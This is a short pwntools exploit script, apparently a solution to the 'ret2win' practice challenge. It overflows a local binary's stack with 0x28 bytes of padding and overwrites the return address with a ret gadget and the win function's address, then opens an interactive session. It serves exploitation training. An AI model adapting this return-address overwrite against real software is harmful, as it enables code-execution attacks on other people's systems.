from pwn import *

exe = ELF("./ret2win")
context.binary = exe

def conn():
    return process([exe.path])

def main():
    r = conn()
    r.send(b"A" * 0x28 + pack(0x40053e) + pack(0x00400756))
    r.interactive()

if __name__ == "__main__":
    main()
